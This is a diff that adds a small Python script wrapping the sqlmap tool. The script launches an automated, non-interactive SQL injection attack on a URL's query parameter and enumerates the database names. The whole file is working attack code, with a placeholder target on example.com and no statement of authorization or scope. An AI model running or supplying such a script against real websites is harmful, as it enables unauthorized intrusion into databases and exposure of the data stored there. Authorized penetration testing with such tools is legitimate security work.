@@ -1,0 +1,27 @@
+import subprocess
+
+def sql_injection_test(target_url, param):
+    # Crafting the SQLMap command
+    sqlmap_command = [
+        "sqlmap",
+        "-u", f"{target_url}?{param}=1",
+        "--batch",  # Use this for non-interactive mode
+        "--dbs"    # Enumerate DBMS databases
+    ]
+
+    try:
+        # Running the SQLMap command
+        result = subprocess.run(sqlmap_command, capture_output=True, text=True)
+        
+        # Output the result
+        print("SQLMap Output:")
+        print(result.stdout)
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+# Example usage
+if __name__ == "__main__":
+    target_url = "http://example.com/vulnerable_param.php"
+    param = "id"
+    sql_injection_test(target_url, param)
